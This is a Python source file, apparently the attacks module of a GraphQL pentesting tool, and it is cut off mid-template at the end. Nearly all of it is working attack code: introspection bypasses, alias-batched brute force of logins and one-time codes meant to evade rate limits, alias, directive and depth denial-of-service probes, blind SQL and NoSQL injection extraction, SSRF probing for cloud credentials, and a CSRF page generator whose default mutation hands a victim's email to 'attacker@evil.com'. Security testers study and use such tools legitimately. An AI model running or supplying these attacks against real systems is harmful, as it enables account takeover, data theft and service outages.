#!/usr/bin/env python3
"""
GraphQLmap v2.0 - Attacks Module
Comprehensive GraphQL attack vectors for pentesting.
"""

from graphqlmap.utils import *
import re
import time
import json
import os
import sys


# ═══════════════════════════════════════════════
# RECONNAISSANCE
# ═══════════════════════════════════════════════

def detect_endpoints(base_url, proxy, headers=None, use_json=False, timeout=10):
    """
    Auto-discover GraphQL endpoints on a target.
    Sends universal query (query{__typename}) to common paths.
    """
    print(colorize("\n[*] Scanning for GraphQL endpoints...", "cyan"))

    # Normalize base URL
    base_url = base_url.rstrip("/")
    if not base_url.startswith("http"):
        base_url = "https://" + base_url

    # Extract base domain (strip any path like /graphql)
    from urllib.parse import urlparse
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    found = []
    for endpoint in COMMON_ENDPOINTS:
        url = base + endpoint
        try:
            # Try POST first
            data = {"query": UNIVERSAL_QUERY}
            r = requests.post(
                url, json=data, verify=False,
                headers=headers or {}, proxies=proxy, timeout=timeout
            )
            if r.status_code == 200 and "__typename" in r.text:
                found.append((url, "POST", r.status_code))
                print(colorize(f"  [+] FOUND (POST): {url}", "green"))
                continue

            # Try GET
            r = requests.get(
                f"{url}?query={UNIVERSAL_QUERY}", verify=False,
                headers=headers or {}, proxies=proxy, timeout=timeout
            )
            if r.status_code == 200 and "__typename" in r.text:
                found.append((url, "GET", r.status_code))
                print(colorize(f"  [+] FOUND (GET): {url}", "green"))
                continue

        except Exception:
            continue

    if not found:
        print(colorize("  [-] No GraphQL endpoints found", "red"))
    else:
        print(colorize(f"\n  [+] Found {len(found)} endpoint(s)", "green"))

    return found


def fingerprint_server(url, method, proxy, headers=None, use_json=False):
    """
    Fingerprint the GraphQL server engine based on error responses
    and HTTP headers.
    """
    print(colorize("\n[*] Fingerprinting GraphQL server...", "cyan"))

    detected = []

    # Send a deliberately malformed query
    test_queries = [
        "{__typename @deprecated}",
        "{__typename @skip(if: true)}",
        "query { thisfieldcannotexist12345 }",
        "{",
        "",
        '{"query": ""}',
    ]

    all_responses = ""

    for tq in test_queries:
        r = requester(url, method, tq, proxy, headers, use_json)
        if r is not None:
            all_responses += r.text.lower()
            # Check response headers
            for hdr_name, hdr_val in r.headers.items():
                all_responses += f" {hdr_name.lower()}:{hdr_val.lower()}"

    for engine, signatures in FINGERPRINT_SIGNATURES.items():
        for sig in signatures:
            if sig.lower() in all_responses:
                if engine not in detected:
                    detected.append(engine)
                    break

    if detected:
        for engine in detected:
            print(colorize(f"  [+] Detected: {engine}", "green"))
    else:
        print(colorize("  [-] Could not fingerprint server engine", "yellow"))

    # Check for specific features
    print(colorize("\n[*] Checking feature support...", "cyan"))

    # Check introspection
    r = requester(url, method, "{__schema{queryType{name}}}", proxy, headers, use_json)
    if r and "queryType" in r.text:
        print(colorize("  [+] Introspection: ENABLED", "green"))
    else:
        print(colorize("  [-] Introspection: DISABLED or restricted", "red"))

    # Check batching
    r = requester(url, method, UNIVERSAL_QUERY, proxy, headers, use_json, is_batch=2)
    if r:
        try:
            data = r.json()
            if isinstance(data, list) and len(data) == 2:
                print(colorize("  [+] JSON List Batching: SUPPORTED", "green"))
            else:
                print(colorize("  [-] JSON List Batching: NOT SUPPORTED", "yellow"))
        except Exception:
            print(colorize("  [-] JSON List Batching: NOT SUPPORTED", "yellow"))

    # Check field suggestions
    r = requester(url, method, "{__typenme}", proxy, headers, use_json)
    if r and ("did you mean" in r.text.lower() or "suggestion" in r.text.lower()):
        print(colorize("  [+] Field Suggestions: ENABLED", "green"))
    else:
        print(colorize("  [-] Field Suggestions: DISABLED or not detected", "yellow"))

    # Check GET support
    r = requester(url, "GET", UNIVERSAL_QUERY, proxy, headers, use_json)
    if r and "__typename" in (r.text or ""):
        print(colorize("  [+] GET Method: SUPPORTED", "green"))
    else:
        print(colorize("  [-] GET Method: NOT SUPPORTED", "yellow"))

    return detected


# ═══════════════════════════════════════════════
# SCHEMA DUMPING & INTROSPECTION
# ═══════════════════════════════════════════════

def display_types(url, method, proxy, headers, use_json):
    """Display available types via __schema."""
    payload = "{__schema{types{name}}}"
    r = requester(url, method, payload, proxy, headers, use_json)
    if r is not None:
        try:
            schema = r.json()
            if 'data' in schema:
                for names in schema['data']['__schema']['types']:
                    print(names)
            elif 'errors' in schema:
                print(colorize(f"[!] Error: {schema['errors'][0].get('message', 'Unknown')}", "red"))
        except Exception as e:
            print(colorize(f"[!] Failed to parse response: {e}", "red"))


def dump_schema(url, method, graphversion, proxy, headers, use_json,
                content_type=None, force_method=None):
    """
    Dump the GraphQL schema via introspection.
    Supports multiple methods and content types for bypass.
    """
    actual_method = force_method or method

    if graphversion > 14:
        payload = INTROSPECTION_QUERY_V15.replace("\n", " ")
    else:
        payload = INTROSPECTION_ONELINER

    r = requester(url, actual_method, payload, proxy, headers, use_json,
                  content_type=content_type)

    if r is None:
        print(colorize("[!] No response received", "red"))
        return None

    try:
        schema = r.json()
    except Exception:
        print(colorize("[!] Response is not valid JSON", "red"))
        return None

    if 'errors' in schema and 'data' not in schema:
        print(colorize(f"[!] Error: {schema['errors'][0].get('message', 'Unknown')}", "red"))
        return None

    if 'data' not in schema:
        print(colorize("[!] Unable to download schema - no 'data' in response", "red"))
        return None

    _display_schema(schema)
    return schema


def _display_schema(schema):
    """Internal helper to display parsed schema."""
    print(colorize("\n============= [SCHEMA] ===============", "cyan"))
    print(f"e.g: {colorize('name', 'green')}[{colorize('Type', 'blue')}]: arg ({colorize('Type', 'yellow')}!)\n")

    for line, types in enumerate(schema['data']['__schema']['types']):
        if types['kind'] == "OBJECT":
            print(f"{line:02}: {colorize(types['name'], 'bold')}")

            if "__" not in types['name']:
                for fields in types.get('fields', []) or []:
                    mutation_args = ""
                    field_type = ""
                    try:
                        field_type = fields['type']['ofType']['name']
                    except Exception:
                        try:
                            field_type = fields['type']['name']
                        except Exception:
                            pass

                    print(f"\t{colorize(fields['name'], 'green')}[{colorize(str(field_type), 'blue')}]: ", end='')

                    # Add to autocomplete
                    if fields['name'] not in cmdlist:
                        cmdlist.append(fields['name'])

                    for args in fields.get('args', []) or []:
                        args_name = args.get('name', '')
                        args_ttype = ""

                        try:
                            if args['type']['name'] is not None:
                                args_ttype = args['type']['name']
                            else:
                                args_ttype = args['type']['ofType']['name']
                        except Exception:
                            pass

                        print(f"{args_name} ({colorize(str(args_ttype), 'yellow')}!), ", end='')
                        if args_name not in cmdlist:
                            cmdlist.append(args_name)

                        mutation_args += f'{args_name}:{args_ttype},'
                    print("")

                    # Generate mutation suggestion
                    if types['name'].lower().strip() in ("mutations", "mutation"):
                        mutation_args = mutation_args.replace('String', '"string"')
                        mutation_args = mutation_args.replace('Boolean', 'true')
                        mutation_args = mutation_args.replace('Int', '1')
                        mutation_args = mutation_args.replace('Float', '1.0')
                        mutation_args = mutation_args.replace('ID', '"1"')
                        mutation_args = mutation_args[:-1] if mutation_args.endswith(',') else mutation_args
                        print(colorize(
                            f"\t(?) mutation{{{fields['name']}({mutation_args}){{ result }}}}",
                            "magenta"
                        ))

    # Also show subscriptions if available
    sub_type = schema['data']['__schema'].get('subscriptionType')
    if sub_type:
        print(colorize(f"\n[+] Subscription type found: {sub_type.get('name', 'N/A')}", "green"))


def introspection_bypass(url, method, proxy, headers, use_json):
    """
    Attempt multiple introspection bypass techniques when standard
    introspection is blocked.
    """
    print(colorize("\n[*] Attempting introspection bypass techniques...", "cyan"))

    techniques = [
        ("Standard POST with spaces", "POST", "{__schema {queryType{name}}}", None),
        ("Newline after __schema", "POST", "{__schema\n{queryType{name}}}", None),
        ("Tab after __schema", "POST", "{__schema\t{queryType{name}}}", None),
        ("Comment injection", "POST", "{__schema#\n{queryType{name}}}", None),
        ("Aliased __schema", "POST", "{s:__schema{queryType{name}}}", None),
        ("GET method bypass", "GET", "{__schema{queryType{name}}}", None),
        ("x-www-form-urlencoded", "POST", "{__schema{queryType{name}}}", "urlencoded"),
        ("__type probe", "POST", '{__type(name:"Query"){name fields{name type{name kind}}}}', None),
        ("With operation name", "POST", "query x{__schema{queryType{name}}}", None),
        ("Fragment on Query", "POST", "{...on Query{__schema{queryType{name}}}}", None),
        ("Whitespace obfuscation", "POST", "{  __schema  {  queryType  {  name  }  }  }", None),
        ("Full introspection via GET", "GET", INTROSPECTION_QUERY_V15.replace("\n", " "), None),
    ]

    for name, tech_method, payload, ctype in techniques:
        try:
            r = requester(url, tech_method, payload, proxy, headers, use_json,
                          content_type=ctype, timeout=15)
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if 'data' in data and data['data'] is not None:
                        has_schema = '__schema' in data.get('data', {}) or '__type' in data.get('data', {})
                        if has_schema:
                            print(colorize(f"  [+] SUCCESS: {name}", "green"))
                            print(colorize(f"      Method: {tech_method}, Content-Type: {ctype or 'default'}", "cyan"))

                            # If we got a full schema, display it
                            if '__schema' in data.get('data', {}):
                                if 'types' in data['data']['__schema']:
                                    print(colorize("  [+] Full schema retrieved! Displaying...", "green"))
                                    _display_schema(data)
                                    return data
                                else:
                                    print(f"      Response: {json.dumps(data, indent=2)[:500]}")
                            else:
                                print(f"      Response: {json.dumps(data, indent=2)[:500]}")
                            continue
                except Exception:
                    pass

            print(colorize(f"  [-] FAILED: {name}", "red"))

        except Exception as e:
            print(colorize(f"  [-] ERROR: {name} - {str(e)}", "red"))

    print(colorize("\n[*] Bypass attempts complete", "cyan"))
    return None


def field_suggestion_attack(url, method, proxy, headers, use_json, wordlist_path=None):
    """
    Recover schema information via field suggestion brute-force.
    Works even when introspection is disabled.
    """
    print(colorize("\n[*] Starting field suggestion brute-force...", "cyan"))
    print(colorize("[*] This works by sending invalid field names and parsing 'Did you mean' suggestions", "cyan"))

    # Load wordlist
    words = []
    if wordlist_path and os.path.exists(wordlist_path):
        with open(wordlist_path, 'r') as f:
            words = [line.strip() for line in f if line.strip()]
    else:
        # Use built-in wordlist
        default_wl = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                                  "wordlists", "graphql_fields.txt")
        if os.path.exists(default_wl):
            with open(default_wl, 'r') as f:
                words = [line.strip() for line in f if line.strip()]
        else:
            words = [
                "user", "users", "admin", "login", "me", "flag", "secret",
                "password", "token", "key", "email", "name", "id", "role",
                "permission", "group", "profile", "account", "session",
                "auth", "query", "mutation", "subscription", "node", "edge",
                "search", "filter", "create", "update", "delete", "upload",
                "file", "image", "post", "comment", "message", "notification",
                "setting", "config", "system", "health", "version", "ping",
                "organization", "team", "project", "task", "order", "product",
                "payment", "customer", "invoice", "report", "dashboard",
            ]

    discovered_fields = set()
    discovered_types = set()

    # Phase 1: Probe root Query fields
    print(colorize(f"\n[*] Phase 1: Probing {len(words)} words against root Query type...", "cyan"))
    for word in words:
        payload = f"query {{ {word} }}"
        r = requester(url, method, payload, proxy, headers, use_json, timeout=10)
        if r is None:
            continue

        text = r.text.lower()

        # Parse suggestions
        suggestions = re.findall(r'did you mean ["\']?(\w+)["\']?', text, re.IGNORECASE)
        suggestions += re.findall(r'did you mean ["\']?(\w+)["\']?', r.text, re.IGNORECASE)

        # Also check for "Cannot query field" which confirms GraphQL is responding
        if "cannot query field" in text and word in text:
            pass  # Field doesn't exist but GraphQL is active

        for s in suggestions:
            if s not in discovered_fields and not s.startswith("__"):
                discovered_fields.add(s)
                print(colorize(f"  [+] Discovered field: {s}", "green"))
                if s not in cmdlist:
                    cmdlist.append(s)

        # Check for type suggestions
        type_suggestions = re.findall(r'on type ["\']?(\w+)["\']?', r.text, re.IGNORECASE)
        for ts in type_suggestions:
            if ts not in discovered_types:
                discovered_types.add(ts)

    # Phase 2: Probe discovered fields for sub-fields
    if discovered_fields:
        print(colorize(f"\n[*] Phase 2: Probing sub-fields of {len(discovered_fields)} discovered fields...", "cyan"))
        for field in list(discovered_fields):
            for word in words[:50]:  # Limit sub-field probing
                payload = f"query {{ {field} {{ {word} }} }}"
                r = requester(url, method, payload, proxy, headers, use_json, timeout=10)
                if r is None:
                    continue

                suggestions = re.findall(r'did you mean ["\']?(\w+)["\']?', r.text, re.IGNORECASE)
                for s in suggestions:
                    key = f"{field}.{s}"
                    if key not in discovered_fields:
                        discovered_fields.add(key)
                        print(colorize(f"  [+] Discovered sub-field: {field} -> {s}", "green"))

    # Summary
    print(colorize(f"\n[+] Summary: Discovered {len(discovered_fields)} fields, {len(discovered_types)} types", "green"))
    if discovered_fields:
        print(colorize("\n  Discovered fields:", "cyan"))
        for f in sorted(discovered_fields):
            print(f"    - {f}")
    if discovered_types:
        print(colorize("\n  Discovered types:", "cyan"))
        for t in sorted(discovered_types):
            print(f"    - {t}")

    return discovered_fields, discovered_types


def type_info(url, method, proxy, headers, use_json, type_name):
    """Get detailed information about a specific GraphQL type."""
    payload = f'{{__type(name:"{type_name}"){{name kind description fields{{name description type{{name kind ofType{{name kind}}}}}}}}}}'
    r = requester(url, method, payload, proxy, headers, use_json)
    if r:
        try:
            data = r.json()
            if 'data' in data and data['data'].get('__type'):
                tinfo = data['data']['__type']
                print(colorize(f"\n[+] Type: {tinfo['name']} ({tinfo['kind']})", "green"))
                if tinfo.get('description'):
                    print(f"    Description: {tinfo['description']}")
                if tinfo.get('fields'):
                    print(colorize("    Fields:", "cyan"))
                    for f in tinfo['fields']:
                        ftype = f['type'].get('name') or (f['type'].get('ofType', {}) or {}).get('name', 'Unknown')
                        print(f"      - {colorize(f['name'], 'green')} [{colorize(str(ftype), 'blue')}]")
                        if f['name'] not in cmdlist:
                            cmdlist.append(f['name'])
            else:
                print(colorize(f"[!] Type '{type_name}' not found or access denied", "red"))
        except Exception as e:
            print(colorize(f"[!] Error: {e}", "red"))


# ═══════════════════════════════════════════════
# QUERY EXECUTION
# ═══════════════════════════════════════════════

def exec_graphql(url, method, query, proxy, headers=None, use_json=False,
                 only_length=0, is_batch=0):
    """Execute a GraphQL query and return formatted output."""
    if headers is None:
        headers = {}
    r = requester(url, method, query, proxy, headers=headers, use_json=use_json,
                  is_batch=is_batch)
    if r is None:
        return colorize("[!] No response received", "red")

    try:
        graphql = r.json()
        errors = graphql.get("errors")

        if errors:
            return colorize(errors[0].get('message', str(errors[0])), "red")
        else:
            try:
                jq_data = jq(graphql)
                if only_length:
                    return len(jq_data)
                else:
                    output = jq_data
                    output = output.replace("{", colorize("{", "green"))
                    output = output.replace("}", colorize("}", "green"))
                    output = re.sub(r'"(.*?)"', colorize(r'"\1"', "magenta"), output)
                    return output
            except Exception:
                return r.text

    except Exception as e:
        return colorize(f"[!] {str(e)}", "red")


def exec_advanced(url, method, query, headers, use_json, proxy):
    """
    Advanced query execution with support for:
    - GRAPHQL_CHARSET: Character brute-force
    - GRAPHQL_INCREMENT_N: Number iteration
    - BATCHING_N: JSON list-based batching
    - Regular query execution
    """
    # Character bruteforce
    if "GRAPHQL_CHARSET" in query:
        graphql_charset = "!$%'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"
        for c in graphql_charset:
            length = exec_graphql(url, method, query.replace("GRAPHQL_CHARSET", c),
                                  proxy, headers, use_json, only_length=1)
            print(f"[+] {colorize('Query', 'green')}: ({colorize(str(length), 'red')}) "
                  f"{query.replace('GRAPHQL_CHARSET', c)}")

    # Number iteration
    elif "GRAPHQL_INCREMENT_" in query:
        regex = re.compile(r"GRAPHQL_INCREMENT_(\d*)")
        match = regex.findall(query)
        if match:
            for i in range(int(match[0])):
                pattern = "GRAPHQL_INCREMENT_" + match[0]
                length = exec_graphql(url, method, query.replace(pattern, str(i)),
                                      proxy, headers, use_json, only_length=1)
                print(f"[+] {colorize('Query', 'green')}: ({colorize(str(length), 'red')}) "
                      f"{query.replace(pattern, str(i))}")

    # JSON list-based batching
    elif "BATCHING_" in query:
        regex = re.compile(r"BATCHING_(\d*)")
        match = regex.findall(query)
        if match:
            batch = int(match[0])
            clean_query = query.replace('BATCHING_' + match[0], '').strip()
            print(f"[+] Sending a batch of {batch} queries")
            r = requester(url, "POST", clean_query, proxy, headers, use_json, is_batch=batch)
            if r:
                try:
                    output = len(r.json())
                    if output == batch:
                        print(colorize(f"[+] Successfully received {batch} outputs", "green"))
                    else:
                        print(colorize(f"[!] Expected {batch} outputs, got {output}", "yellow"))
                except Exception:
                    print(colorize(f"[!] Failed to parse batch response", "red"))

    # Regular query
    else:
        print(exec_graphql(url, method, query, proxy, headers=headers, use_json=use_json))


# ═══════════════════════════════════════════════
# ALIAS-BASED ATTACKS
# ═══════════════════════════════════════════════

def alias_bruteforce(url, method, proxy, headers, use_json):
    """
    Alias-based brute force attack for bypassing rate limiting.
    Useful for password brute-force, 2FA bypass, OTP bypass.
    """
    print(colorize("\n[*] Alias-Based Brute Force Attack", "cyan"))
    print("[*] This sends multiple aliased mutations in a single request to bypass rate limiting\n")

    mutation_name = input("Mutation/Query name (e.g., login): ").strip()
    if not mutation_name:
        print(colorize("[!] Mutation name required", "red"))
        return

    # Get the field template
    print("Enter the mutation template with BRUTE placeholder:")
    print(f"  Example: {mutation_name}(username: \"admin\", password: \"BRUTE\")")
    template = input("Template > ").strip()
    if not template:
        print(colorize("[!] Template required", "red"))
        return

    # Get the return fields
    return_fields = input("Return fields (e.g., token, success): ").strip() or "id"

    # Get values to brute force
    print("Enter values to try (one per line, empty line to finish):")
    print("  Or provide a file path starting with @")
    values = []
    first_input = input("Values > ").strip()

    if first_input.startswith("@"):
        filepath = first_input[1:]
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                values = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(values)} values from file")
        else:
            print(colorize(f"[!] File not found: {filepath}", "red"))
            return
    else:
        if first_input:
            values.append(first_input)
        while True:
            v = input("  > ").strip()
            if not v:
                break
            values.append(v)

    if not values:
        print(colorize("[!] No values provided", "red"))
        return

    # Build aliased query
    batch_size = int(input(f"Batch size (default: {min(len(values), 50)}): ").strip()
                     or min(len(values), 50))

    is_mutation = input("Is this a mutation? (y/n, default: y): ").strip().lower() != 'n'

    print(colorize(f"\n[*] Sending {len(values)} attempts in batches of {batch_size}...", "cyan"))

    for batch_start in range(0, len(values), batch_size):
        batch_values = values[batch_start:batch_start + batch_size]
        aliases = []

        for i, val in enumerate(batch_values):
            alias_name = f"attempt_{batch_start + i}"
            aliased = template.replace("BRUTE", val)
            aliases.append(f"{alias_name}: {aliased} {{ {return_fields} }}")

        op_type = "mutation" if is_mutation else "query"
        query = f"{op_type} {{ {' '.join(aliases)} }}"

        r = requester(url, "POST", query, proxy, headers, use_json)
        if r:
            try:
                data = r.json()
                if 'data' in data:
                    for key, value in data['data'].items():
                        idx = int(key.split('_')[1]) if '_' in key else 0
                        if value and value not in [None, {}, [], '']:
                            val_used = values[idx] if idx < len(values) else "?"
                            print(colorize(f"  [+] HIT: {val_used} -> {json.dumps(value)}", "green"))
                elif 'errors' in data:
                    print(colorize(f"  [!] Error: {data['errors'][0].get('message', '')}", "red"))
            except Exception as e:
                print(colorize(f"  [!] Parse error: {e}", "red"))

    print(colorize("\n[+] Brute force complete", "green"))


def alias_dos(url, method, proxy, headers, use_json):
    """
    Test for alias overloading DoS vulnerability.
    Sends increasing numbers of aliased queries to measure response time.
    """
    print(colorize("\n[*] Alias Overloading DoS Test", "cyan"))
    print("[*] Testing with increasing alias counts...\n")

    counts = [1, 10, 50, 100, 500, 1000]
    results = []

    for count in counts:
        aliases = " ".join([f"a{i}:__typename" for i in range(count)])
        query = f"{{ {aliases} }}"

        start = time.time()
        r = requester(url, method, query, proxy, headers, use_json, timeout=60)
        elapsed = time.time() - start

        if r:
            status = r.status_code
            size = len(r.text)
            results.append((count, elapsed, status, size))
            print(f"  Aliases: {count:5d} | Time: {elapsed:.3f}s | Status: {status} | Size: {size}")

            if elapsed > 10:
                print(colorize(f"\n  [!] Response took {elapsed:.1f}s with {count} aliases - likely vulnerable!", "red"))
                break
        else:
            print(f"  Aliases: {count:5d} | FAILED (timeout or error)")
            print(colorize(f"\n  [!] Server failed at {count} aliases - likely vulnerable to DoS!", "red"))
            break

    if len(results) >= 2:
        ratio = results[-1][1] / max(results[0][1], 0.001)
        if ratio > 5:
            print(colorize(f"\n  [!] VULNERABLE: Response time increased {ratio:.1f}x", "red"))
        else:
            print(colorize(f"\n  [+] Response time ratio: {ratio:.1f}x - may have protections", "green"))


def directive_dos(url, method, proxy, headers, use_json):
    """
    Test for directive overloading DoS vulnerability.
    Sends queries with increasing numbers of @skip/@include directives.
    """
    print(colorize("\n[*] Directive Overloading DoS Test", "cyan"))
    print("[*] Testing with increasing directive counts...\n")

    counts = [1, 10, 50, 100, 500]

    for count in counts:
        directives = " ".join(["@skip(if: false)" for _ in range(count)])
        query = f"{{ __typename {directives} }}"

        start = time.time()
        r = requester(url, method, query, proxy, headers, use_json, timeout=60)
        elapsed = time.time() - start

        if r:
            status = r.status_code
            try:
                data = r.json()
                has_data = 'data' in data
                has_error = 'errors' in data
            except Exception:
                has_data = False
                has_error = True

            result_str = "DATA" if has_data else ("ERROR" if has_error else "UNKNOWN")
            print(f"  Directives: {count:5d} | Time: {elapsed:.3f}s | Status: {status} | Result: {result_str}")

            if has_data and count >= 100:
                print(colorize(f"\n  [!] Server accepted {count} directives - potentially vulnerable!", "red"))
        else:
            print(f"  Directives: {count:5d} | FAILED")
            break


# ═══════════════════════════════════════════════
# DEPTH / COMPLEXITY DoS
# ═══════════════════════════════════════════════

def depth_dos(url, method, proxy, headers, use_json):
    """
    Generate and test deeply nested queries for depth limit bypass.
    """
    print(colorize("\n[*] Query Depth DoS Test", "cyan"))

    # Ask for a field that has circular references
    field_name = input("Field with self-reference (e.g., 'user' with 'friends'): ").strip() or "user"
    nested_field = input("Nested field name (e.g., 'friends'): ").strip() or "friends"
    leaf_field = input("Leaf field to return (e.g., 'id'): ").strip() or "id"

    depths = [5, 10, 20, 50, 100]

    for depth in depths:
        # Build nested query
        query = f"{{ {field_name} {{ "
        for _ in range(depth):
            query += f"{nested_field} {{ "
        query += leaf_field
        for _ in range(depth):
            query += " }"
        query += " } }"

        start = time.time()
        r = requester(url, method, query, proxy, headers, use_json, timeout=30)
        elapsed = time.time() - start

        if r:
            status = r.status_code
            try:
                data = r.json()
                if 'errors' in data:
                    msg = data['errors'][0].get('message', '')[:80]
                    print(f"  Depth: {depth:5d} | Time: {elapsed:.3f}s | ERROR: {msg}")
                    if "depth" in msg.lower() or "complex" in msg.lower():
                        print(colorize(f"  [+] Depth limit detected at depth {depth}", "green"))
                        break
                else:
                    print(f"  Depth: {depth:5d} | Time: {elapsed:.3f}s | Status: {status} | SUCCESS")
            except Exception:
                print(f"  Depth: {depth:5d} | Time: {elapsed:.3f}s | Status: {status}")
        else:
            print(f"  Depth: {depth:5d} | TIMEOUT/FAILED")
            print(colorize(f"  [!] Server failed at depth {depth} - possible DoS!", "red"))
            break


# ═══════════════════════════════════════════════
# INJECTION ATTACKS
# ═══════════════════════════════════════════════

def blind_nosql(url, method, proxy, headers, use_json):
    """Blind NoSQL injection via GraphQL with enhanced payloads."""
    print(colorize("\n[*] Blind NoSQL Injection", "cyan"))
    print("[*] Include BLIND_PLACEHOLDER in your query where the injection point is\n")

    query = input("Query > ")
    check = input("Check (known value to verify) > ")
    charset = input("Charset (default: abcdefghijklmnopqrstuvwxyz1234567890) > ")
    if not charset:
        charset = "abcdefghijklmnopqrstuvwxyz1234567890"

    data = ""
    _break = False

    while not _break:
        old_data = data
        for c in charset:
            injected = query.replace("BLIND_PLACEHOLDER", data + c)
            r = requester(url, method, injected, proxy, headers, use_json)
            if r and check in r.text:
                data += c
                print(f"\r{colorize('[+] Data found:', 'green')} {data}", end='', flush=True)
        if old_data == data:
            _break = True
    print("")

    if data:
        print(colorize(f"\n[+] Final extracted data: {data}", "green"))
    else:
        print(colorize("\n[-] No data extracted", "red"))


def blind_sqli(url, method, proxy, headers, use_json, db_type="postgresql"):
    """
    Enhanced blind SQL injection with multiple payload support.
    Supports: PostgreSQL, MySQL, MSSQL, Oracle, SQLite.
    """
    print(colorize(f"\n[*] Blind {db_type.upper()} Injection", "cyan"))
    print("[*] Include BLIND_PLACEHOLDER in your query\n")

    query = input("Query > ")

    payloads = SQLI_PAYLOADS.get(db_type, [])
    if not payloads:
        print(colorize(f"[!] No payloads for {db_type}", "red"))
        return

    print(colorize(f"\n[*] Testing {len(payloads)} payloads...", "cyan"))

    for i, payload in enumerate(payloads):
        injected = query.replace("BLIND_PLACEHOLDER", payload)
        print(f"\n  [{i+1}/{len(payloads)}] Payload: {colorize(payload, 'yellow')}")

        start = time.time()
        r = requester(url, method, injected, proxy, headers, use_json, timeout=35)
        elapsed = time.time() - start

        if r:
            print(f"    Time: {elapsed:.2f}s | Status: {r.status_code} | Size: {len(r.text)}")
            if elapsed > 25:
                print(colorize(f"    [!] TIME-BASED INJECTION DETECTED! ({elapsed:.1f}s delay)", "red"))
            elif r.status_code == 500:
                print(colorize(f"    [!] Server error - possible injection point", "yellow"))
        else:
            if elapsed > 25:
                print(colorize(f"    [!] TIMEOUT - possible time-based injection!", "red"))
            else:
                print(colorize(f"    [-] No response", "red"))


def blind_postgresql(url, method, proxy, headers, use_json):
    """Blind PostgreSQL injection wrapper."""
    blind_sqli(url, method, proxy, headers, use_json, "postgresql")


def blind_mysql(url, method, proxy, headers, use_json):
    """Blind MySQL injection wrapper."""
    blind_sqli(url, method, proxy, headers, use_json, "mysql")


def blind_mssql(url, method, proxy, headers, use_json):
    """Blind MSSQL injection wrapper."""
    blind_sqli(url, method, proxy, headers, use_json, "mssql")


def blind_oracle(url, method, proxy, headers, use_json):
    """Blind Oracle injection wrapper."""
    blind_sqli(url, method, proxy, headers, use_json, "oracle")


def blind_sqlite(url, method, proxy, headers, use_json):
    """Blind SQLite injection wrapper."""
    blind_sqli(url, method, proxy, headers, use_json, "sqlite")


def ssrf_test(url, method, proxy, headers, use_json):
    """
    Test for SSRF vulnerabilities through GraphQL mutations/queries
    that accept URL parameters.
    """
    print(colorize("\n[*] SSRF Test via GraphQL", "cyan"))
    print("[*] Include SSRF_PLACEHOLDER in your query where URLs are accepted\n")

    query = input("Query with SSRF_PLACEHOLDER > ")
    if "SSRF_PLACEHOLDER" not in query:
        print(colorize("[!] Query must contain SSRF_PLACEHOLDER", "red"))
        return

    print(colorize(f"\n[*] Testing {len(SSRF_PAYLOADS)} SSRF payloads...", "cyan"))

    for i, payload in enumerate(SSRF_PAYLOADS):
        injected = query.replace("SSRF_PLACEHOLDER", payload)
        r = requester(url, method, injected, proxy, headers, use_json, timeout=15)

        if r:
            status = r.status_code
            size = len(r.text)

            # Check for indicators of successful SSRF
            interesting = False
            indicators = ["root:", "localhost", "internal", "metadata",
                          "ami-id", "instance-id", "AccessKeyId", "SecretAccessKey"]
            for ind in indicators:
                if ind.lower() in r.text.lower():
                    interesting = True
                    break

            if interesting:
                print(colorize(f"  [{i+1}] {payload} -> Status: {status} | Size: {size} | INTERESTING!", "red"))
                print(colorize(f"       Response preview: {r.text[:200]}", "yellow"))
            elif status == 200 and size > 50:
                print(f"  [{i+1}] {payload} -> Status: {status} | Size: {size}")
            else:
                print(colorize(f"  [{i+1}] {payload} -> Status: {status} | Size: {size}", "yellow"))
        else:
            print(colorize(f"  [{i+1}] {payload} -> FAILED/TIMEOUT", "red"))


# ═══════════════════════════════════════════════
# CSRF
# ═══════════════════════════════════════════════

def generate_csrf_poc(url, method, proxy, headers, use_json):
    """
    Generate CSRF proof-of-concept HTML for GraphQL endpoints
    that accept GET or x-www-form-urlencoded POST.
    """
    print(colorize("\n[*] CSRF PoC Generator", "cyan"))

    query = input("GraphQL query/mutation to CSRF > ").strip()
    if not query:
        query = 'mutation{changeEmail(email:"attacker@evil.com"){success}}'

    # Test what methods are accepted
    print(colorize("\n[*] Testing accepted methods...", "cyan"))

    # Test GET
    r = requester(url, "GET", query, proxy, headers, use_json)
    get_works = r and r.status_code == 200 and 'data' in r.text

    # Test x-www-form-urlencoded
    r = requester(url, "POST", query, proxy, headers, use_json, content_type="urlencoded")
    urlencoded_works = r and r.status_code == 200 and 'data' in r.text

    pocs = []

    if get_works:
        print(colorize("  [+] GET method accepted - generating GET-based CSRF PoC", "green"))
        from urllib.parse import quote
        poc_get = f"""<!DOCTYPE html>
<html>
<head><title>GraphQL CSRF PoC (GET)</title></head>
<body>
<h1>GraphQL CSRF - GET Method</h1>
<img src="{url}?query={quote(query)}" style="display:none" />
<script>
  // Alternative: fetch-based
  fetch("{url}?query={quote(query)}", {{
    mode: 'no-cors',
    credentials: 'include'
  }});
</script>
<p>CSRF payload delivered via GET request.</p>
</body>
</html>"""
        pocs.append(("csrf_get.html", poc_get))

    if urlencoded_works:
        print(colorize("  [+] x-www-form-urlencoded accepted - generating form-based CSRF PoC", "green"))
        poc_form = f"""<!DOCTYPE html>
<html>
<head><title>GraphQL CSRF PoC (POST Form)</title></head>
<body>
<h1>GraphQL CSRF - POST Form</h1>
<form id="csrf-form" action="{url}" method="POST" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="query" value='{query}' />
  <input type="submit" value="Submit" />
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
</body>
</html>"""
        pocs.append(("csrf_form.html", poc_form))

    # Always generate a fetch-based PoC (may work if CORS is misconfigured)
    poc_fetch = f"""<!DOCTYPE html>
<html>
<head><title>GraphQL CSRF PoC (Fetch JSON)</title></head>
<body>
<h1>GraphQL CSRF - Fetch with JSON</h1>
<script>
  // This requires CORS misconfiguration or same-origin
  fetch("{url}", {{
    method: "POST",
    credentials: "include",
    headers: {{
      "Content-Type": "application/json"
    }},
    body: JSON.stringify({{
      query: `{query}`
    }})
  }}).then(r => r.json()).then(d => {{
    document.getElementById('result').textContent = JSON.stringify(d);
  }}).catch(e => {{
